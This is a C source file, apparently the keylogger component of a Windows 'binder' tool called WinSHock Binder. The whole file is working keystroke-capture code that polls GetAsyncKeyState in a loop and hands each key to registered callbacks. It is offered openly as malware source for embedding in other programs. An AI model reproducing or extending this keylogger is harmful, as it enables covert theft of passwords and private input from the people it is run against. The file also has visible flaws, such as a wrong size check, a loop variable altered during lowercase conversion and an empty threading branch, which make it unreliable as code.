// WinSHock Binder (WsBind) Keylogger Stub
// Copyright (C) 2020 iDigitalFlame
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU Affero General Public License as published
// by the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU Affero General Public License for more details.
//
// You should have received a copy of the GNU Affero General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.
//

typedef void (*KeyFunction)(unsigned char);

typedef struct KEYLISTENER
{
    int count;
    int maxSize;
    KeyFunction *functions;
} KeyListener;

void __wsk_start_scan(int wsScanDuration);
void __wsk_notify_key(unsigned char wsKey);

KeyListener KEY_ARRAY;

int wsk_register_size(int wsSize)
{
    if(wsSize >= KEY_ARRAY.count)
    {
        KeyFunction *function_back = KEY_ARRAY.functions;
        if((KEY_ARRAY.functions = realloc(KEY_ARRAY.functions, wsSize * sizeof(KeyFunction))) == NULL)
        {
            KEY_ARRAY.functions = function_back;
            return KEY_ARRAY.maxSize;
        }
        KEY_ARRAY.maxSize = wsSize;
        return wsSize;
    }
    return KEY_ARRAY.maxSize;
}
void __wsk_start_scan(int wsScanDuration)
{
    short wsKey, wsStatus;
    long wsTime, wsTimeStart = GetTickCount();
    while(1)
    {
        Sleep(20);
        for(wsKey = 8; wsKey <= 222; wsKey++)
        {
            wsStatus = GetAsyncKeyState(wsKey);
            if(wsStatus == -32767 || wsStatus == 1)
            {
                if((wsKey > 64) && (wsKey < 97)) wsKey += 32;
                __wsk_notify_key((unsigned char)wsKey);
            }
        }
        if(wsScanDuration > 0)
        {
            wsTime = GetTickCount();
            if(wsTime <= 0) break;
            if(wsTime - wsTimeStart >= wsScanDuration) break;
        }
    }
}
void __wsk_notify_key(unsigned char wsKey)
{
    int wsStart;
    for(wsStart = 0; wsStart < KEY_ARRAY.count; wsStart++)
        KEY_ARRAY.functions[wsStart](wsKey);
}
int wsk_register_listener(KeyFunction wsFunction)
{
    if(KEY_ARRAY.count == KEY_ARRAY.maxSize || (KEY_ARRAY.count + 1) > KEY_ARRAY.maxSize)
    {
        KeyFunction *function_back = KEY_ARRAY.functions;
        if(KEY_ARRAY.maxSize == 0) KEY_ARRAY.maxSize = 1;
        if((KEY_ARRAY.functions = realloc(KEY_ARRAY.functions, KEY_ARRAY.maxSize * 2 * sizeof(KeyFunction))) == NULL)
        {
            KEY_ARRAY.functions = function_back;
            return 0;
        }
        KEY_ARRAY.maxSize *= 2;
    }
    KEY_ARRAY.functions[KEY_ARRAY.count++] = wsFunction;
    return 1;
}
HANDLE wsk_start_scan(int wsThreaded, int wsScanDuration)
{
    if(wsThreaded)
    {

    }
    __wsk_start_scan(wsScanDuration);
    return NULL;
}
